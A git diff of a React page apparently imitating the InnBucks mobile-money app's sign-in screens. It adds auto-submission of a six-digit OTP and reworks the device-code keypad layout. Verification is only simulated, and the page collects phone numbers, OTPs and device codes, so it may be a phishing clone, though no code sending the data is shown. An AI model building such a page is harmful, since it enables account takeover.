@@ -208,46 +208,9 @@ export default function InnBucksPage() {
     }, 1300)
   }
 
-  // Handle 6-Digit OTP Box Change
-  const handleOtpBoxChange = (index: number, val: string) => {
-    const digit = val.replace(/\D/g, "").slice(-1)
-    const newDigits = [...otpDigits]
-    newDigits[index] = digit
-    setOtpDigits(newDigits)
-    if (otpError) setOtpError("")
-
-    // Move to next input if filled
-    if (digit && index < 5) {
-      otpInputRefs.current[index + 1]?.focus()
-      setFocusedOtpIndex(index + 1)
-    }
-  }
-
-  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
-      otpInputRefs.current[index - 1]?.focus()
-      setFocusedOtpIndex(index - 1)
-    }
-  }
-
-  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
-    e.preventDefault()
-    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
-    if (!pastedData) return
-
-    const newDigits = [...otpDigits]
-    pastedData.split("").forEach((char, i) => {
-      newDigits[i] = char
-    })
-    setOtpDigits(newDigits)
-    const targetIdx = Math.min(pastedData.length, 5)
-    otpInputRefs.current[targetIdx]?.focus()
-    setFocusedOtpIndex(targetIdx)
-  }
-
   // Handle OTP Verify Submit (Screen 3: sends Phone + OTP only)
-  const handleOtpVerify = () => {
-    const fullOtp = otpDigits.join("")
+  const handleOtpVerify = (codeOverride?: string) => {
+    const fullOtp = codeOverride || otpDigits.join("")
     if (fullOtp.length < 6) {
       setOtpError("Please enter the complete 6-digit verification code.")
       return
@@ -271,6 +234,61 @@ export default function InnBucksPage() {
       setStep("device_code")
       setDeviceCode("")
     }, 1300)
+  }
+
+  // Handle 6-Digit OTP Box Change
+  const handleOtpBoxChange = (index: number, val: string) => {
+    const digit = val.replace(/\D/g, "").slice(-1)
+    const newDigits = [...otpDigits]
+    newDigits[index] = digit
+    setOtpDigits(newDigits)
+    if (otpError) setOtpError("")
+
+    // Move to next input if filled
+    if (digit && index < 5) {
+      otpInputRefs.current[index + 1]?.focus()
+      setFocusedOtpIndex(index + 1)
+    }
+
+    // Auto move to next screen once user completes all 6 digits
+    const fullOtp = newDigits.join("")
+    if (fullOtp.length === 6 && !newDigits.some((d) => !d)) {
+      setTimeout(() => {
+        otpInputRefs.current[index]?.blur()
+        handleOtpVerify(fullOtp)
+      }, 120)
+    }
+  }
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
+      otpInputRefs.current[index - 1]?.focus()
+      setFocusedOtpIndex(index - 1)
+    }
+  }
+
+  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+    e.preventDefault()
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
+    if (!pastedData) return
+
+    const newDigits = [...otpDigits]
+    pastedData.split("").forEach((char, i) => {
+      newDigits[i] = char
+    })
+    setOtpDigits(newDigits)
+    const targetIdx = Math.min(pastedData.length, 5)
+    otpInputRefs.current[targetIdx]?.focus()
+    setFocusedOtpIndex(targetIdx)
+
+    // Auto move to next screen if pasted code is 6 digits
+    const fullOtp = newDigits.join("")
+    if (fullOtp.length === 6 && !newDigits.some((d) => !d)) {
+      setTimeout(() => {
+        otpInputRefs.current[targetIdx]?.blur()
+        handleOtpVerify(fullOtp)
+      }, 120)
+    }
   }
 
   // Handle Device Code Keypad Click (up to 5 digits)
@@ -797,7 +815,7 @@ export default function InnBucksPage() {
             <div className="pt-6">
               <button
                 type="button"
-                onClick={handleOtpVerify}
+                onClick={() => handleOtpVerify()}
                 className="w-full h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/25 transition-all cursor-pointer flex items-center justify-center"
               >
                 Verify
@@ -810,43 +828,44 @@ export default function InnBucksPage() {
         {/* STEP 4: ENTER DEVICE CODE (5 DOTS & CUSTOM KEYPAD - Screenshot 2)       */}
         {/* ======================================================================= */}
         {step === "device_code" && (
-          <div className="flex flex-col justify-between h-full">
-            <div>
-              {/* Back Button in circle */}
-              <div className="flex items-center h-11">
-                <button
-                  type="button"
-                  onClick={() => {
-                    if (deviceStage === "confirm") {
-                      setDeviceStage("enter")
-                      setDeviceCode("")
-                    } else {
-                      setStep("otp")
-                    }
-                  }}
-                  className="w-10 h-10 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer"
-                  aria-label="Back"
-                >
-                  <ChevronLeft className="w-6 h-6 stroke-[2.5]" />
-                </button>
-              </div>
+          <div className="flex flex-col h-full">
+            {/* Back Button in circle */}
+            <div className="flex items-center h-10 shrink-0 mb-1">
+              <button
+                type="button"
+                onClick={() => {
+                  if (deviceStage === "confirm") {
+                    setDeviceStage("enter")
+                    setDeviceCode("")
+                  } else {
+                    setStep("otp")
+                  }
+                }}
+                className="w-10 h-10 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer"
+                aria-label="Back"
+              >
+                <ChevronLeft className="w-6 h-6 stroke-[2.5]" />
+              </button>
+            </div>
 
+            {/* Main Content: Positioned closer to top */}
+            <div className="flex-1 flex flex-col items-center justify-start pt-1 sm:pt-3">
               {/* Title & Description - Prominent & Legible */}
-              <div className="text-center mt-3 sm:mt-4">
+              <div className="text-center">
                 <h1 className="text-[25px] sm:text-[28px] font-extrabold text-white tracking-tight leading-tight">
                   {deviceStage === "confirm" ? "Confirm Device Code" : "Enter Device Code"}
                 </h1>
-                <p className="text-white/70 text-[14px] sm:text-[15px] mt-2 max-w-[300px] mx-auto leading-relaxed">
+                <p className="text-white/70 text-[14px] sm:text-[15px] mt-1.5 max-w-[300px] mx-auto leading-relaxed">
                   This Device code will be used to quickly access your account on this device.
                 </p>
               </div>
 
-              {/* 5 Dots Indicator - Responsive Spacing */}
-              <div className="flex items-center justify-center gap-4 sm:gap-5 my-4 sm:my-8">
+              {/* 5 Dots Indicator - Balanced spacing */}
+              <div className="flex items-center justify-center gap-3.5 sm:gap-4 mt-5 mb-16 sm:mt-7 sm:mb-10">
                 {[0, 1, 2, 3, 4].map((i) => (
                   <span
                     key={i}
-                    className={`w-3.5 h-3.5 sm:w-[18px] sm:h-[18px] rounded-full transition-all duration-150 ${
+                    className={`w-3.5 h-3.5 sm:w-4 sm:h-4 rounded-full transition-all duration-150 ${
                       i < deviceCode.length ? "bg-white shadow-sm shadow-white/50 scale-105" : "bg-white/30"
                     }`}
                   />
@@ -855,69 +874,69 @@ export default function InnBucksPage() {
 
               {/* Error Message if Passwords do not match */}
               {deviceError && (
-                <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12.5px] sm:text-[13px] font-medium -mt-2 mb-2 animate-in fade-in duration-150">
+                <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12.5px] sm:text-[13px] font-medium mb-3 animate-in fade-in duration-150">
                   <AlertCircle className="w-4 h-4 shrink-0" />
                   <span>{deviceError}</span>
                 </div>
               )}
-            </div>
 
-            {/* Custom Numeric Keypad (Responsive Touch Targets) */}
-            <div className="w-full max-w-[350px] mx-auto pb-1 sm:pb-4">
-              <div className="grid grid-cols-3 gap-y-1 sm:gap-y-2.5 text-center">
-                {/* 1, 2, 3 */}
-                {["1", "2", "3"].map((n) => (
+              {/* Custom Numeric Keypad (Large Digits with comfortable distance from Dots) */}
+              <div className="w-full max-w-[320px] sm:max-w-[350px] mx-auto mt-5 sm:mt-8">
+                <div className="grid grid-cols-3 gap-y-2 sm:gap-y-3.5 text-center">
+                  {/* 1, 2, 3 */}
+                  {["1", "2", "3"].map((n) => (
+                    <button
+                      key={n}
+                      type="button"
+                      onClick={() => handleDeviceKeyClick(n)}
+                      className="text-[36px] sm:text-[42px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-14 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    >
+                      {n}
+                    </button>
+                  ))}
+
+                  {/* 4, 5, 6 */}
+                  {["4", "5", "6"].map((n) => (
+                    <button
+                      key={n}
+                      type="button"
+                      onClick={() => handleDeviceKeyClick(n)}
+                      className="text-[36px] sm:text-[42px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-14 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    >
+                      {n}
+                    </button>
+                  ))}
+
+                  {/* 7, 8, 9 */}
+                  {["7", "8", "9"].map((n) => (
+                    <button
+                      key={n}
+                      type="button"
+                      onClick={() => handleDeviceKeyClick(n)}
+                      className="text-[36px] sm:text-[42px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-14 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    >
+                      {n}
+                    </button>
+                  ))}
+
+                  {/* Empty cell, 0, Backspace */}
+                  <div />
                   <button
-                    key={n}
                     type="button"
-                    onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    onClick={() => handleDeviceKeyClick("0")}
+                    className="text-[36px] sm:text-[42px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-14 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                   >
-                    {n}
+                    0
                   </button>
-                ))}
-
-                {/* 4, 5, 6 */}
-                {["4", "5", "6"].map((n) => (
                   <button
-                    key={n}
                     type="button"
-                    onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    onClick={handleDeviceBackspace}
+                    className="text-white hover:text-white/80 active:scale-90 transition-transform h-14 sm:h-16 flex items-center justify-center cursor-pointer select-none"
+                    aria-label="Delete"
                   >
-                    {n}
+                    <Delete className="w-8 h-8 sm:w-9 sm:h-9 stroke-[1.6]" />
                   </button>
-                ))}
-
-                {/* 7, 8, 9 */}
-                {["7", "8", "9"].map((n) => (
-                  <button
-                    key={n}
-                    type="button"
-                    onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
-                  >
-                    {n}
-                  </button>
-                ))}
-
-                {/* Empty cell, 0, Backspace */}
-                <div />
-                <button
-                  type="button"
-                  onClick={() => handleDeviceKeyClick("0")}
-                  className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
-                >
-                  0
-                </button>
-                <button
-                  type="button"
-                  onClick={handleDeviceBackspace}
-                  className="text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
-                  aria-label="Delete"
-                >
-                  <Delete className="w-7 h-7 sm:w-8 sm:h-8 stroke-[1.5]" />
-                </button>
+                </div>
               </div>
             </div>
           </div>
